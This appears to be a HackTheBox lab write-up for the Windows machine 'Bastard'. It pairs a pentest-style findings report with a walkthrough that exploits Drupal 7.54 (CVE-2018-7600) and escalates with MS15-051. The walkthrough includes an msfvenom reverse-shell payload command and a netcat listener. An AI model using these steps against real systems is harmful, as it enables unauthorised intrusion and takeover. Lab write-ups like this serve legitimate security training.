# Report - Bastard

Bastard HackTheBox Practice Report

Testing Summary

Bastard is a Medium rated machine at HackTheBox, the machine operating system is Windows Server 2008R2 Datacenter, with the initial foothold being a web application vulnerability abusing Drupal 7.54. The CVE-2018-7600 detail scores the Drupal 7 vulnerability as 9.8 (Critical). The Privilege escalation on the server could have multiple options, however the one that works is MS15-051 with a CVSS score of 7.8 (high) worked for me at the time of this report.

Tester Notes and Recommendations

Updating and possibly upgrading the Bastard system to the latest most stable version of Drupal, as well as update and upgrade the host system operating system would be the best path forward to resolve these issues. Administrators having a regularly scheduled outage and downtime can prevent this risk from happening and maintain good security policy.

Key Weaknesses found during the assessment:

1. Insufficient Patch Management - Software
2. Insufficient Patch Management - Operating Systems

Testing Findings

Internal Penetration Test Findings:

Finding 1: Insufficient Patch Management - Software 

| Description | This webpage is a webpage which is outward facing from the network, which allows for anyone to be able to access it and navigate to the login portal.  From this point on, the likely hood of a attacker being able to gain access to the host operating system and having access to the internal network is very high. This exploit allows for attackers to execute arbitrary code because of known issues in relation to subsystems and default or common module configurations.
-Drupal 7.54 |
| --- | --- |
| Risk | Likelyhood: High
Impact: Very High |
| System | Bastard |
| Tools Used | Exploit-db, Searchsploit, ffuf |
| References | [https://nvd.nist.gov/vuln/detail/cve-2018-7600](https://nvd.nist.gov/vuln/detail/cve-2018-7600)
[https://github.com/pimps/CVE-2018-7600/tree/master](https://github.com/pimps/CVE-2018-7600/tree/master) |

Evidence:

![image.png](image.png)

![image.png](image%201.png)

![image.png](image%202.png)

Remediation:

Finding 2:

| Description | The Windows server 2008R2 Operating System version has been End of Life since January 2020.
No new Updates or Extended Security updates are offered for this system for a few years, this makes the system vulnerable to new forms of vulnerabilities which are no longer covered by Microsoft. |
| --- | --- |
| Risk | Likelyhood: High
Impact: Very High |
| System | Bastard |
| Tools Used | windows-exploit-suggester, SecWiki/Kernel-Windows-Shell-Exploits |
| References | [https://nvd.nist.gov/vuln/detail/cve-2015-1701](https://nvd.nist.gov/vuln/detail/cve-2015-1701)
[https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip) 
NIST SP800-53 r4 MA-6 – Maintenance 
NIST SP800-53 r4 SI-2 – Flaw Remediation |

Evidence:

![image.png](image%203.png)

![image.png](image%204.png)

Remediation:

Patch the environment to the latest stable version of Windows Server Database as soon as possible.

Walkthrough Path

Bastard is a windows machine with a Drupal 7 vulnerability with many opportunities for privesc once you have your first shell. Lets start off with a nmap scan.

![image.png](image%205.png)

The ports that are available to look around in are, Port 80, port 135 and port 49154. Port 80 is http, and has a few different documents available for viewing, lets check out port 80 first. If you just enter the IP address into the address bar this is what you see. If you have the wappalyzer plug-in, I suggest you use it, you can easily see what is running on that webpage, which is Drupal 7.

![image.png](image.png)

Lets see if we can get more information about the version of Drupal 7, and then look up some exploits. Some of the webpages listed from the nmap scan have some interesting information, specifically CHANGELOG.txt, if you look at that webpage you can gather the specific version of Drupal that the Bastard server is using.

![image.png](image%201.png)

I also found some hits from the webpage hinting at having a Microsoft server set up on the system. From the httpmethods.txt page.

![image.png](image%206.png)

Ok so now lets start looking for a Drupal 7.54 vulnerability which allows for us to skip over the login of the webpage, and get direct access. A Drupal 7.54 Remote Code Execution Vulnerability, CVE-2018-7600.   On the National Vulnerability Database the CVE-2018-7600 is a RCE vulnerability with a base score of 9.8 Critical. [https://nvd.nist.gov/vuln/detail/cve-2018-7600](https://nvd.nist.gov/vuln/detail/cve-2018-7600).

A Github page with a reliable exploit, I did not have good luck with the exploit-db version of this exploit, [https://www.exploit-db.com/exploits/44449](https://www.exploit-db.com/exploits/44449), if you want to give it a shot you should be able to download this from a updated database of msfconsole.

Searchsploit -m 44449

Now with my initial failure to attack this system is out of the way, here is the attack method that works, using this exploit from pimps ([https://github.com/pimps/CVE-2018-7600/tree/master](https://github.com/pimps/CVE-2018-7600/tree/master)) , you can use it as a RCE and collect information about the system as well as get a remote shell on the system.

![image.png](image%207.png)

You can also get a copy of the user.txt flag on the system this way as well…

![image.png](image%208.png)

Now getting onto the system and gaining Privilege Escalation. Time to create a reverse shell to our local system, we can do this using msfvenom replace ‘tun0’ with your local Kali IP.

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=443 -f exe > shell.exe
```

Now you have shell.exe to copy over to the system, Now create a directory so you have Read, Write and Modify permissions on and copy over your reverse shell onto it. It would look something like this…

![image.png](image%202.png)

Now you can create a netcat listener to listen for the shell.exe call back to your system.

```bash
nc -lnvp 443
```

Now execute the shell.exe on the remote system, you should have local user connection.

![image.png](image%209.png)

Now following all the same options as before lets collect the systeminfo from Bastard and run it against windows-exploit-suggester.

![image.png](image%2010.png)

Look at all of those vulnerabilities, lets try MS15-051x64 [https://nvd.nist.gov/vuln/detail/cve-2015-1701](https://nvd.nist.gov/vuln/detail/cve-2015-1701)

Going to [https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip) will allow you to download the zip file and copy over the 64 bit version since according to windows-exploit-suggester it is a x64 bit system.

![image.png](image%2011.png)

Sherlock didn’t want to work for me, so my second opinion I guess doesn’t matter. Lets use what we know is good from the windows-exploit-suggester, copy over the MS15-051 exploit, copy the 64 bit version and nc.exe from kali over to the Bastard box and see if we can get a Kernel reverse shell on the system.

![image.png](image%2012.png)

Copied all of those over to Bastard’s C:\temp

![image.png](image%203.png)

And now running netcat to have a cmd.exe prompt on my local kali listener using port 4444.

![image.png](image%204.png)

Hey look NT Authority\System, neat!

Proof that I did the thing:

https://www.hackthebox.com/achievement/machine/1184690/7